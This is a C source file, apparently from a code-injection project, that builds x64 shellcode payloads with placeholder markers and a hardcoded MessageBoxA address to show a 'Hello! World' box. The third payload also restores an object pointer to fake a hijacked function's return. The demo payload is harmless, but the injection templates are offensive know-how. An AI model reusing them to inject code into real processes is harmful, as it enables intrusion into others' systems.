#include "LoadLibraryR.h"

void* memmem(const void* haystack, size_t haystack_len, const void* const needle, const size_t needle_len)
{
	if (haystack == NULL) return NULL; // or assert(haystack != NULL);
	if (haystack_len == 0) return NULL;
	if (needle == NULL) return NULL; // or assert(needle != NULL);
	if (needle_len == 0) return NULL;

	for (const char* h = (const char*)haystack;
		haystack_len >= needle_len;
		++h, --haystack_len) {
		if (!memcmp(h, needle, needle_len)) {
			return (void*)h;
		}
	}
	return NULL;
}

/*
		mov rax,0x4444444444444444
		push rax
		mov rax,0x5555555555555555
		push rax
		xor rcx,rcx
		mov rdx,rsp
		mov r8,rsp
		add r8,8
		xor r9,r9
		mov rax,0x3333333333333333
		sub rsp,0x28
		call rax
		add rsp,0x38
		mov rax,0xdeadbeef
		//ret (C3)
		jmp -2 (EB FE)
*/

char* _gen_payload_1() {
	char* payload;
	long long marker_text = 0x4444444444444444;
	char text[8] = "Hello!";
	long long marker_caption = 0x5555555555555555;
	char caption[8] = "World";
	long long marker_func = 0x3333333333333333;
	void* func_ptr = "\x70\xAA\x92\x8F\xFC\x7F\x00\x00"; //MessageBoxA

	payload = (char*)malloc(PAYLOAD1_SIZE);

	if (payload == NULL)
		return NULL;

	memcpy(payload, "\x48\xB8\x44\x44\x44\x44\x44\x44\x44\x44\x50\x48\xB8\x55\x55\x55\x55\x55\x55\x55\x55\x50\x48\x31\xC9\x48\x89\xE2\x49\x89\xE0\x49\x83\xC0\x08\x4D\x31\xC9\x48\xB8\x70\xAA\x92\x8F\xFC\x7F\x00\x00\x48\x83\xEC\x28\xFF\xD0\x48\x83\xC4\x38\x48\xB8\xEF\xBE\xAD\xDE\x00\x00\x00\x00\xEB\xFE", PAYLOAD1_SIZE);
	memcpy(memmem(payload, PAYLOAD1_SIZE, (char*)&marker_text, 8), text, 8);
	memcpy(memmem(payload, PAYLOAD1_SIZE, (char*)&marker_caption, 8), caption, 8);
	//memcpy(memmem(payload, PAYLOAD1_SIZE, (char*)&marker_func, 8), &func_ptr, 8);

	return payload;
}


/*
	mov rax,0x4444444444444444
	push rax
	mov rax,0x5555555555555555
	push rax
	xor rcx,rcx
	mov rdx,rsp
	mov r8,rsp
	add r8,8
	xor r9,r9
	mov rax,0x3333333333333333
	sub rsp,0x28
	call rax
	add rsp,0x38
	mov rax,0xdeadbeef
	ret //(C3)
	//jmp -2 (EB FE)
*/

char* _gen_payload_2()
{
	char* payload;
	long long marker_text = 0x4444444444444444;
	char text[8] = "Hello!";
	long long marker_caption = 0x5555555555555555;
	char caption[8] = "World";
	long long marker_func = 0x3333333333333333;
	char* func_ptr = "\x70\xAA\x92\x8F\xFC\x7F\x00\x00"; //MessageBoxA

	payload = (char*)malloc(PAYLOAD2_SIZE);

	if (payload == NULL)
		return NULL;

	//memcpy(payload, "\x48\xB8\x44\x44\x44\x44\x44\x44\x44\x44\x50\x48\xB8\x55\x55\x55\x55\x55\x55\x55\x55\x50\x48\x31\xC9\x48\x89\xE2\x49\x89\xE0\x49\x83\xC0\x08\x4D\x31\xC9\x48\xB8\x33\x33\x33\x33\x33\x33\x33\x33\x48\x83\xEC\x28\xFF\xD0\x48\x83\xC4\x38\x48\xB8\xEF\xBE\xAD\xDE\x00\x00\x00\x00\xC3", PAYLOAD2_SIZE);
	memcpy(payload, ("\x48\xB8\x44\x44\x44\x44\x44\x44\x44\x44\x50\x48\xB8\x55\x55\x55"
		"\x55\x55\x55\x55\x55\x50\x48\x31\xC9\x48\x89\xE2\x49\x89\xE0\x49"
		"\x83\xC0\x08\x4D\x31\xC9\x48\xB8\x70\xAA\x92\x8F\xFC\x7F\x00\x00"
		"\x48\x83\xEC\x28\xFF\xD0\x48\x83\xC4\x38\x48\xB8\xEF\xBE\xAD\xDE\x00\x00\x00\x00\xc3"), PAYLOAD2_SIZE);
	memcpy(memmem(payload, PAYLOAD2_SIZE, (char*)&marker_text, 8), text, 8);
	memcpy(memmem(payload, PAYLOAD2_SIZE, (char*)&marker_caption, 8), caption, 8);
	//memcpy(memmem(payload, PAYLOAD2_SIZE, (char*)&marker_func, 8), &func_ptr, 8);
	
	return payload;
}

/*
shellcode = (LPVOID)("\x48\xB8\x48\x65\x6C\x6C\x6F\x21\x00\x00\x50\x48\xB8\x57\x6F\x72"
	"\x6C\x64\x00\x00\x00\x50\x48\x31\xC9\x48\x89\xE2\x49\x89\xE0\x49"
	"\x83\xC0\x08\x4D\x31\xC9\x48\xB8\x70\xAA\x92\x8F\xFC\x7F\x00\x00"
	"\x48\x83\xEC\x28\xFF\xD0\x48\x83\xC4\x38\x48\xB8\xEF\xBE\xAD\xDE\x00\x00\x00\x00\xc3\x00");

							"\x48\xB8\x44\x44\x44\x44\x44\x44\x44\x44\x50\x48\xB8\x55\x55\x55"
	"\x55\x55\x55\x55\x55\x50\x48\x31\xC9\x48\x89\xE2\x49\x89\xE0\x49"
	"\x83\xC0\x08\x4D\x31\xC9\x48\xB8\x33\x33\x33\x33\x33\x33\x33\x33"
	"\x48\x83\xEC\x28\xFF\xD0\x48\x83\xC4\x38\x48\xB8\xEF\xBE\xAD\xDE\x00\x00\x00\x00\xC3"

	*/




	/*
		mov rax,0x4444444444444444
		push rax
		mov rax,0x5555555555555555
		push rax
		xor rcx,rcx
		mov rdx,rsp
		mov r8,rsp
		add r8,8
		xor r9,r9
		mov rax,0x3333333333333333
		sub rsp,0x28  // Extra 8 bytes to make sure the stack is 16-byte aligned.
		call rax
		add rsp,0x38
		mov eax,2 // simulate the return of the original object function
		mov rbx,0x6666666666666666 // restore the original object pointer into rbx
		ret
	*/

char* _gen_payload_3()
{
	char* payload;
	DWORD64 marker_text = 0x4444444444444444;
	char text[8] = "Hello!";
	DWORD64 marker_caption = 0x5555555555555555;
	char caption[8] = "World";
	DWORD64 marker_func = 0x3333333333333333;
	void* func_ptr = MessageBoxA;

	payload = (char*)malloc(PAYLOAD3_SIZE);

	if (payload == NULL)
		return NULL;

	memcpy(payload, "\x48\xB8\x44\x44\x44\x44\x44\x44\x44\x44\x50\x48\xB8\x55\x55\x55\x55\x55\x55\x55\x55\x50\x48\x31\xC9\x48\x89\xE2\x49\x89\xE0\x49\x83\xC0\x08\x4D\x31\xC9\x48\xB8\x70\xAA\x92\x8F\xFC\x7F\x00\x00\x48\x83\xEC\x28\xFF\xD0\x48\x83\xC4\x38\xB8\x02\x00\x00\x00\x48\xBB\x66\x66\x66\x66\x66\x66\x66\x66\xC3", PAYLOAD3_SIZE);
	memcpy(memmem(payload, PAYLOAD3_SIZE, (char*)&marker_text, 8), text, 8);
	memcpy(memmem(payload, PAYLOAD3_SIZE, (char*)&marker_caption, 8), caption, 8);
	//memcpy(memmem(payload, PAYLOAD3_SIZE, (char*)&marker_func, 8), &func_ptr, 8);

	return payload;
}